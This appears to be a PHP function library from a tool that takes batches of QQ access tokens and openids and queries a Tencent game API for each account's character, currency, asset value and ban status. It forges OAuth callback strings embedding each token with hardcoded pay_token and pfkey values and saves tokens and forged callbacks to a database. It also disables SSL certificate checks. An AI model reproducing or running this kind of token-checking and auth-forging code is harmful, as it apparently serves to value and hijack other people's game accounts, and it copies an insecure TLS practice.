<?php
// 公共函数库

/**
 * 安全转义字符串
 * @param string $str 需要转义的字符串
 * @return string 转义后的字符串
 */
function escape($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

/**
 * 解析查询字符串
 * @param string $query 查询字符串
 * @return array 解析后的关联数组
 */
function parse_query_string($query) {
    $result = [];
    $parts = explode('&', $query);
    foreach ($parts as $part) {
        if (strpos($part, '=') !== false) {
            list($key, $value) = explode('=', $part, 2);
            $result[$key] = $value;
        }
    }
    return $result;
}

/**
 * 获取账号数据
 * @param string $access_token 访问令牌
 * @param string $openid 开放ID
 * @return array 账号数据
 */
function fetch_account_data($access_token, $openid) {
    $url = API_URL . '?needGopenid=1&isPreengage=1&' .
           'sAMSAcctype=qq&sAMSAccessToken=' . urlencode($access_token) . '&' .
           'sAMSAppOpenId=' . urlencode($openid) . '&' .
           'sAMSTargetAppId=1110543085&' .
           'sAMSSourceAppId=1110543085&' .
           'game=dfm&sCloudApiName=ams.gameattr.role&area=36&platid=1';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, REQUEST_TIMEOUT);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Referer: https://gp.qq.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    ]);
    // 禁用SSL证书验证以解决SSL证书错误问题
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        return ['error' => $error];
    }

    // 解析响应数据
    if (preg_match("/data:'([^']+)'/", $response, $matches)) {
        $data_str = $matches[1];
        return parse_query_string($data_str);
    }

    return ['error' => '未找到数据'];
}

/**
 * 格式化账号数据
 * @param array $data 账号数据
 * @param string $access_token 访问令牌
 * @param string $openid 开放ID
 * @return array [callback_info, formatted_info]
 */
function format_account_data($data, $access_token, $openid) {
    if (isset($data['error'])) {
        $error_msg = "账号 " . escape($access_token) . " 获取数据失败: " . escape($data['error']);
        return [$error_msg, $error_msg];
    }

    $callback_info = format_callback_response($data, $access_token, $openid);
    $formatted_info = format_formatted_response($data, $callback_info);
    return [$callback_info, $formatted_info];
}

/**
 * 格式化callback响应
 * @param array $data 账号数据
 * @param string $access_token 访问令牌
 * @param string $openid 开放ID
 * @return string callback格式的响应
 */
function format_callback_response($data, $access_token, $openid) {
    return "_Callback({\"ret\": 0,\"url\": \"auth://tauth.qq.com/?#access_token={$access_token}&expires_in=604800&openid={$openid}&pay_token=274B0EDCC18100E1094463F2DFAF87D0&ret=0&pf=desktop_m_qq-10000144-android-2002-&pfkey=86c9155735699365efa99f4ec0d1f6f7&auth_time=1716609564&page_type=0\"});";
}

/**
 * 格式化详细响应
 * @param array $data 账号数据
 * @param string $callback_info callback信息
 * @return string 详细的账号状态信息
 */
function format_formatted_response($data, $callback_info) {
    $charac_name = isset($data['charac_name']) ? urldecode($data['charac_name']) : '未知';
    $charac_no = isset($data['uid']) ? $data['uid'] : '未知';
    $level = isset($data['level']) ? $data['level'] : '未知';
    $hafcoinnum = isset($data['hafcoinnum']) ? intval($data['hafcoinnum']) : 0;
    $propcapital = isset($data['propcapital']) ? intval($data['propcapital']) : 0;
    $islogined = isset($data['islogined']) ? $data['islogined'] : '未知';
    $logintoday = isset($data['logintoday']) ? $data['logintoday'] : '未知';
    $tdmlevel = isset($data['tdmlevel']) ? $data['tdmlevel'] : '未知';
    $isbanspeak = isset($data['isbanspeak']) ? $data['isbanspeak'] : '未知';
    $isbanuser = isset($data['isbanuser']) ? $data['isbanuser'] : '未知';

    $is_online = $islogined == '1' ? "是" : "否";
    $logged_in_today = $logintoday == '1' ? "是" : "否";
    $is_muted = $isbanspeak == '1' ? "是" : "否";
    $is_banned = $isbanuser == '1' ? "是" : "否";

    $total_assets = $hafcoinnum + $propcapital;
    $total_assets_formatted = $total_assets >= 1000000 ? number_format($total_assets / 1000000, 1) . 'M' : strval($total_assets);

    $lastlogintime = convert_timestamp(isset($data['lastlogintime']) ? $data['lastlogintime'] : null);
    $lastlogouttime = convert_timestamp(isset($data['lastlogouttime']) ? $data['lastlogouttime'] : null);

    return sprintf(
        "账号大区：安卓区 | 角色名称：%s | 角色编号：%s | 游戏等级：%s | 哈夫币：%s | 道具价值：%s | 仓库价值：%s | 在线：%s | 今日登录：%s | 特定模式等级：%s | 禁言：%s | 封号：%s\n最后登录时间：%s | 最后登出时间：%s\n%s",
        escape($charac_name),
        escape($charac_no),
        escape($level),
        escape(strval($hafcoinnum)),
        escape(strval($propcapital)),
        escape($total_assets_formatted),
        escape($is_online),
        escape($logged_in_today),
        escape($tdmlevel),
        escape($is_muted),
        escape($is_banned),
        escape($lastlogintime),
        escape($lastlogouttime),
        $callback_info
    );
}

/**
 * 转换时间戳
 * @param string $timestamp 时间戳
 * @return string 格式化的时间字符串
 */
function convert_timestamp($timestamp) {
    try {
        if ($timestamp && intval($timestamp) > 0) {
            return date('Y-m-d H:i:s', intval($timestamp));
        }
        return "未知";
    } catch (Exception $e) {
        return "时间格式不正确";
    }
}

/**
 * 保存文件
 * @param string $content 文件内容
 * @param string $filename 文件名
 * @return bool 是否保存成功
 */
function save_file($content, $filename) {
    $file_path = DOWNLOAD_DIR . $filename;
    return file_put_contents($file_path, $content) !== false;
}

/**
 * 发送数据到后台数据库
 * @param array $data 要存储的数据
 * @return bool 是否存储成功
 */
function send_to_backend($data) {
    try {
        // 确保logs目录存在
        if (!is_dir(__DIR__ . '/logs')) {
            mkdir(__DIR__ . '/logs', 0755, true);
        }
        
        // 加载数据库类
        require_once __DIR__ . '/database/Database.php';
        
        // 初始化数据库连接
        $database = new Database();
        
        // 提取数据
        $formatted_data = isset($data['formatted_data']) ? $data['formatted_data'] : '';
        $callback_data = isset($data['callback_data']) ? $data['callback_data'] : '';
        $timestamp = isset($data['timestamp']) ? $data['timestamp'] : date('Ymd_His');
        $total_records = isset($data['total_records']) ? $data['total_records'] : 0;
        
        if (empty($formatted_data)) {
            error_log('格式化数据为空，跳过存储', 3, __DIR__ . '/logs/skip_upload.log');
            return false;
        }
        
        // 分割每一行数据进行解析
        $lines = explode("\n\n", $formatted_data);
        $success_count = 0;
        $processed_accounts = [];
        
        // 开始事务
        $database->beginTransaction();
        
        try {
            foreach ($lines as $line) {
                if (empty(trim($line))) continue;
                
                try {
                    // 尝试提取access_token和openid（从最后一行的callback信息中）
                    $lines_parts = explode("\n", $line);
                    $callback_line = end($lines_parts);
                    
                    $access_token = '';
                    $openid = '';
                    
                    if (preg_match('/access_token=([^&]+)/', $callback_line, $match)) {
                        $access_token = $match[1];
                    }
                    
                    if (preg_match('/openid=([^&]+)/', $callback_line, $match)) {
                        $openid = $match[1];
                    }
                    
                    // 生成唯一标识（如果没有access_token和openid）
                    if (empty($access_token) || empty($openid)) {
                        $access_token = 'temp_' . md5($line . $timestamp);
                        $openid = 'temp_openid_' . md5($line . $timestamp);
                    }
                    
                    // 检查是否已经处理过相同的账号
                    $account_key = $access_token . '_' . $openid;
                    if (isset($processed_accounts[$account_key])) {
                        continue;
                    }
                    $processed_accounts[$account_key] = true;
                    
                    // 尝试先查找是否已存在相同的token和openid组合
                    $existing_raw = $database->selectOne('account_raw_data', ['id'], [
                        'access_token' => $access_token,
                        'openid' => $openid
                    ]);
                    
                    // 构建完整的账号数据
                    $account_data = [
                        'access_token' => $access_token,
                        'openid' => $openid,
                        'raw_data' => $line,
                        'updated_at' => date('Y-m-d H:i:s')
                    ];
                    
                    if ($existing_raw) {
                        // 已存在，更新原始数据
                        $raw_data_id = $existing_raw['id'];
                        $database->update('account_raw_data', $account_data, ['id' => $raw_data_id]);
                    } else {
                        // 不存在，插入新记录
                        $account_data['created_at'] = date('Y-m-d H:i:s');
                        $raw_data_id = $database->insert('account_raw_data', $account_data);
                    }
                    
                    // 解析账号状态信息 - 提取更完整的字段
                    $status_info = [];
                    $status_info['raw_data'] = $line;
                    $status_info['timestamp'] = $timestamp;
                    
                    // 提取所有关键信息
                    if (preg_match('/角色名称：([^|]+)\|/', $line, $match)) {
                        $status_info['role_name'] = trim($match[1]);
                        $status_info['charac_name'] = trim($match[1]); // 保留旧键名以保持兼容性
                    }
                    
                    if (preg_match('/角色编号：([^|]+)\|/', $line, $match)) {
                        $status_info['charac_no'] = trim($match[1]);
                    }
                    
                    if (preg_match('/游戏等级：([^|]+)\|/', $line, $match)) {
                        $status_info['game_level'] = trim($match[1]);
                        $status_info['level'] = trim($match[1]); // 保留旧键名以保持兼容性
                    }
                    
                    if (preg_match('/哈夫币：([^|]+)\|/', $line, $match)) {
                        $status_info['haf_coin'] = trim($match[1]);
                        $status_info['hafcoinnum'] = trim($match[1]); // 保留旧键名以保持兼容性
                    }
                    
                    if (preg_match('/道具价值：([^|]+)\|/', $line, $match)) {
                        $status_info['propcapital'] = trim($match[1]);
                    }
                    
                    if (preg_match('/仓库价值：([^|]+)\|/', $line, $match)) {
                        $status_info['total_assets'] = trim($match[1]);
                    }
                    
                    if (preg_match('/在线：([^|]+)\|/', $line, $match)) {
                        $status_info['is_online'] = trim($match[1]);
                    }
                    
                    if (preg_match('/今日登录：([^|]+)\|/', $line, $match)) {
                        $status_info['logintoday'] = trim($match[1]);
                    }
                    
                    if (preg_match('/特定模式等级：([^|]+)\|/', $line, $match)) {
                        $status_info['tdmlevel'] = trim($match[1]);
                    }
                    
                    if (preg_match('/禁言：([^|]+)\|/', $line, $match)) {
                        $status_info['isbanspeak'] = trim($match[1]);
                    }
                    
                    if (preg_match('/封号：([^|]+)/', $line, $match)) {
                        $status_info['isbanuser'] = trim($match[1]);
                    }
                    
                    if (preg_match('/最后登录时间：([^|]+)/', $line, $match)) {
                        $status_info['lastlogintime'] = trim($match[1]);
                    }
                    
                    if (preg_match('/最后登出时间：([^|\n]+)/', $line, $match)) {
                        $status_info['lastlogouttime'] = trim($match[1]);
                    }
                    
                    // 获取角色名称、角色编号和游戏等级
                    $charac_name = isset($status_info['charac_name']) ? $status_info['charac_name'] : '未知';
                    $charac_no = isset($status_info['charac_no']) ? $status_info['charac_no'] : '未知';
                    $level = isset($status_info['level']) ? $status_info['level'] : '未知';
                    $is_online = isset($status_info['is_online']) ? $status_info['is_online'] : '未知';
                    
                    // 设置状态（默认在线）
                    $status = 'online'; // 默认设置为在线
                    if ($is_online === '否') {
                        $status = 'offline';
                    }
                    
                    // 将status添加到status_info数组中，以便前端使用
                    $status_info['status'] = $status;
                    
                    // 检查是否满足不上传条件
                    if ($charac_name === '未知' && $charac_no === '未知' && $level === '未知') {
                        // 角色名称、角色编号和游戏等级都为未知，跳过上传
                        error_log('角色信息不完整（角色名称、编号、等级均为未知），跳过上传: ' . $line, 3, __DIR__ . '/logs/skip_upload.log');
                    } else {
                        // 存储或更新账号状态数据
                        // 先检查是否已有状态数据
                        $existing_status = $database->selectOne('account_status_data', ['id'], [
                            'account_id' => $raw_data_id
                        ]);
                        
                        $status_data = [
                            'status_data' => json_encode($status_info, JSON_UNESCAPED_UNICODE),
                            'status' => $status,
                            'updated_at' => date('Y-m-d H:i:s')
                        ];
                        
                        if ($existing_status) {
                            // 更新现有状态数据
                            $database->update('account_status_data', $status_data, ['account_id' => $raw_data_id]);
                        } else {
                            // 插入新状态数据
                            $status_data['account_id'] = $raw_data_id;
                            $status_data['created_at'] = date('Y-m-d H:i:s');
                            $database->insert('account_status_data', $status_data);
                        }
                        
                        $success_count++;
                    }
                } catch (Exception $e) {
                    // 单条记录失败不影响其他记录的处理
                    error_log('单条数据处理失败: ' . $e->getMessage(), 3, __DIR__ . '/logs/error.log');
                    continue;
                }
            }
            
            // 提交事务
            $database->commit();
            
            // 记录操作日志
            $database->insert('operation_logs', [
                'operation_type' => 'frontend_data_upload',
                'operator' => 'system',
                'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'description' => "前台数据上传，批次号: {$timestamp}，总记录数: {$total_records}，处理: " . count($lines) . ", 成功: {$success_count}",
                'created_at' => date('Y-m-d H:i:s')
            ]);
            
            return $success_count > 0;
        } catch (Exception $e) {
            // 回滚事务
            $database->rollback();
            error_log('事务处理失败: ' . $e->getMessage(), 3, __DIR__ . '/logs/error.log');
            return false;
        }
    } catch (Exception $e) {
        // 记录错误日志
        error_log('数据上传到数据库失败: ' . $e->getMessage(), 3, __DIR__ . '/logs/error.log');
        return false;
    }
}